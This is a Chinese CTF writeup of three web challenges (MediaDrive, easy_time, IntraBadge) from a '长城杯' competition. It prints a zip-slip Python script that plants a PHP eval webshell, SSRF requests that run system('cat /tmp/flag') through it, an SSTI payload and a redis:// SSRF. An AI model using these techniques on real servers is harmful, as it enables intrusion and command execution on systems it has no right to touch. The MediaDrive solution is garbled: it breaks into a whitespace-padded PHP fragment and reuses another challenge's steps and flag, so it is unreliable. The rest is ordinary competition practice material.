# [个人队伍] 第三届长城杯的Writeup

> **2026年3月23日11:40 ~ 2029年12月15日1:40**
>
> **比赛地址：https://gz.imxbt.cn/games/36/challenges#**
>
> **复现地址：https://gz.imxbt.cn/games/36/challenges#**

> 团队赛
>
> # 第三届长城杯半决赛
>
> **278**支队伍已报名
>
> 开始时间
>
> 2026年3月23日晚上11点40分
>
> 结束时间
>
> 2029年12月15日凌晨1点40分
>
> 
>
> 题目代码均在 https://download.imxbt.cn/ctf/CCB2026_hb/ 处可以下载，wso2已解压，无需输入密码，建议使用motrix多线程下载，具体题目描述可以在“题目.md”中查看



# All

## Web

### MediaDrive

#### 题目信息

> ## MediaDrive250 pts
>
> 某企业内部部署了一套媒体管理后台 MediaDrive，用于员工上传、预览和管理各类媒体文件。系统支持文件编码兼容转换功能，以便处理来自不同地区与旧系统的文件名。然而，近期安全团队在例行巡检中发现，该系统在处理用户偏好、文件路径转换以及文件预览时存在潜在安全风险。

#### 解题过程

**代码审计**

**preview.php**

```php
<?php
declare(strict_types=1);
require_once __DIR__ . "/lib/User.php";
require_once __DIR__ . "/lib/Util.php";

$user = null;
if (isset($_COOKIE['user'])) {
    $user = @unserialize($_COOKIE['user']);
}
if (!$user instanceof User) {
    $user = new User("guest");
    setcookie("user", serialize($user), time() + 86400, "/");
}

$f = (string)($_GET['f'] ?? "");
if ($f === "") {
    http_response_code(400);
    echo "Missing parameter: f";
    exit;
}

$rawPath = $user->basePath . $f;

if (preg_match('/flag|\/flag|\.\.|php:|data:|expect:/i', $rawPath)) {
    http_response_code(403);
    echo "Access denied";
    exit;
}

$convertedPath = @iconv($user->encoding, "UTF-8//IGNORE", $rawPath);
if ($convertedPath === false || $convertedPath === "") {
    http_response_code(500);
    echo "Conversion failed";
    exit;
}

$content = @file_get_contents($convertedPath);
if ($content === false) {
    http_response_code(404);
    echo "Not found";
    exit;
}

$displayRaw = $rawPath;
$displayConv = $convertedPath;
$isText = true;

for ($i=0; $i<min(strlen($content), 512); $i++) {
    $c = ord($content[$i]);
    if ($c === 0) { $isText = false; break; }
}

?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Preview · MediaDrive</title>
  <link rel="stylesheet" href="/assets/style.css"/>
</head>
<body>
  <div class="app">
    <header class="topbar">
      <div class="brand">
        <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
        <a class="brand-title link" href="/">MediaDrive</a>
        <span class="badge">Preview</span>
      </div>
      <div class="actions">
        <a class="btn ghost" href="/profile.php">Preferences</a>
      </div>
    </header>

    <main class="content">
      <section class="card">
        <div class="card-head">
          <h2>File Preview</h2>
          <p class="muted">Converted paths are shown for debugging.</p>
        </div>

        <div class="kv">
          <div><span class="k">User</span><span class="v"><?= Util::h($user->name) ?></span></div>
          <div><span class="k">Encoding</span><span class="v mono"><?= Util::h($user->encoding) ?></span></div>
          <div><span class="k">Raw path</span><span class="v mono"><?= Util::h($displayRaw) ?></span></div>
          <div><span class="k">Converted</span><span class="v mono"><?= Util::h($displayConv) ?></span></div>
        </div>

        <div class="row-actions">
          <a class="btn ghost" href="/">Back</a>
          <a class="btn" href="/download.php?f=<?= urlencode($f) ?>">Download</a>
        </div>

        <div class="preview">
          <?php if ($isText): ?>
            <pre><?= Util::h($content) ?></pre>
          <?php else: ?>
            <pre class="mono"><?=
              Util::h(bin2hex(substr($content, 0, 2048)))
            ?></pre>
            <div class="hint">Binary preview (hex, first 2KB)</div>
          <?php endif; ?>
        </div>
      </section>
    </main>

    <footer class="footer">
      <span class="muted">MediaDrive · Internal tool</span>
      <a class="muted" href="/health.php">health</a>
    </footer>
  </div>
</body>
</html>
```

**分析**

- **$rawPath = $user->basePath . $f;**

  **$f = (string)($_GET['f'] ?? "");**

  **$user = new User("guest");**

  ```php
  <?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ?>")
```

```shell
上传并解压成功
```

**个人头像SSFR**

```shell
http://127.0.0.1/phpinfo.php
```

```shell
远程头像 URL：http://127.0.0.1/phpinfo.php
远程信息： type=text/html; charset=UTF-8 len=? len=b'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0
```

```shell
http://127.0.0.1/php.php?cmd=system("cat%20/tmp/flag");
```

```shell
远程头像 URL：http://127.0.0.1/php.php?cmd=system("cat%20/tmp/flag");
远程信息： type=text/html; charset=UTF-8 len=43 len=b'flag{5d6d4441-ec04-4b4d-9354-013baddf203b}\n'
```

#### 题目答案

**得到：flag{5d6d4441-ec04-4b4d-9354-013baddf203b}**



### easy_time

#### 题目信息

> ## easy_time251 pts
>
> 你明白时间的真谛吗

#### 解题过程

**弱口令爆破**

```shell
username：admin
password：secret
```

```shell
后台面板
当前用户：admin
```

**构造路径穿梭恶意压缩包**

```python
import zipfile

with zipfile.ZipFile('zip.zip', 'w') as zf:
    zf.writestr('../../../../../../../../var/www/html/php.php', "<?php @eval($_GET['cmd']);?>")
```

```shell
D:\Environment\python\python-3.13.0\python.exe D:\Work\test\python\2\Main.py 

进程已结束，退出代码为 0
```

**在上传插件上传压缩包**

```shell
zip.zip
```

```shell
上传并解压成功
```

**在上传头像利用ssfr**

```shell
http://127.0.0.1/phpinfo.php
```

```shell
本地头像
未上传
远程头像 URL：http://127.0.0.1/phpinfo.php
远程信息： type=text/html; charset=UTF-8 len=? len=b'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0
```

```shell
http://127.0.0.1/php.php?cmd=system("cat%20/tmp/f*");
```

```shell
本地头像
未上传
远程头像 URL：http://127.0.0.1/php.php?cmd=system("cat%20/tmp/f*");
远程信息： type=text/html; charset=UTF-8 len=43 len=b'flag{5d6d4441-ec04-4b4d-9354-013baddf203b}\n'
```

#### 题目答案

**得到：flag{5d6d4441-ec04-4b4d-9354-013baddf203b}**



### **IntraBadge**

#### 题目信息

> ##  IntraBadge252 pts
>
> 某企业开发了一套用于内部员工展示的“徽章卡片系统”，员工可自定义展示模板并填写头像 URL，由系统自动抓取并缓存头像资源后进行页面渲染。在开发阶段，为了便于调试与快速上线，部分模板渲染与资源抓取功能未进行严格安全限制。

#### 解题过程

**信息搜集**

```shell
{"avatar_cache_hint":"Avatar is cached first. Non-image content won't be shown as image.","meta":"","redis":"127.0.0.1:6379","service":"IntraBadge"}
```

**分析**

- **127.0.0.1:6379**

**在Badge Preview利用ssti**

```shell
No Avatar -> {{ avatar_raw_text() }}
```

**在Dashboard利用ssfr**

```shell
redis://127.0.0.1:6379/0/flag
```

#### 题目答案

**得到：flag{a15e688e-1b77-45d1-aebc-1bbd0e9b1946}**



# 队伍

## 名称

**菜鸟对对队**



## 口号

**对对对对对**



## 成员

### 队长

- **probie**

### 队员

- **probie**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**